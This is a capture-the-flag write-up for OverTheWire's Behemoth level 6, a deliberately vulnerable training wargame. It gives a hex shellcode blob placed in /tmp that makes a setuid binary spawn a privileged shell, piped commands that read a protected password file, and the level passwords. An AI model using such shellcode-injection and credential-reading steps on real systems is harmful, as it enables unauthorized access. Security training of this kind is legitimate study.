# Behemoth Level 06 to 07

| Field | Value |
|---|---|
| Platform | OverTheWire |
| Wargame | Behemoth |
| Level | 6 -> 7 |
| Status | Complete |

## Objective

Make `behemoth6_reader` output the exact string `HelloKitty` so `behemoth6` grants a shell as `behemoth7`.

## Given Access

User: `behemoth6`

Password:

```text
j9I1wHzfVC
```

## Recon

`behemoth6` runs `/behemoth/behemoth6_reader` with `popen()`, reads 10 bytes, and compares them to `HelloKitty`. The reader loads `shellcode.txt`, rejects any byte `0x0b`, mmaps the file, and executes it.

## Method

Create `shellcode.txt` in a writable directory such as `/tmp` with shellcode that:

1. writes `HelloKitty` to stdout
2. exits cleanly

Then run `/behemoth/behemoth6` from the same directory and feed shell commands to the privileged `/bin/sh` it execs on success.

## Commands

```bash
ssh -p 2221 behemoth6@behemoth.labs.overthewire.org
cd /tmp
python3 - <<'PY'
from pathlib import Path
Path('shellcode.txt').write_bytes(bytes.fromhex(
    'eb165931c0b00431db4331d2b20acd8031c0b00131dbcd80e8e5ffffff48656c6c6f4b69747479'
))
print(Path('shellcode.txt').stat().st_size)
PY
printf 'whoami
id
cat /etc/behemoth_pass/behemoth7
exit
' | /behemoth/behemoth6
```

## Result

Password for `behemoth7`:

```text
sV17oOQTKc
```

## Lesson

When a challenge shells only after a helper prints a magic string, solve the helper’s contract directly instead of chasing a more complicated payload.

## References

- https://overthewire.org/wargames/behemoth/
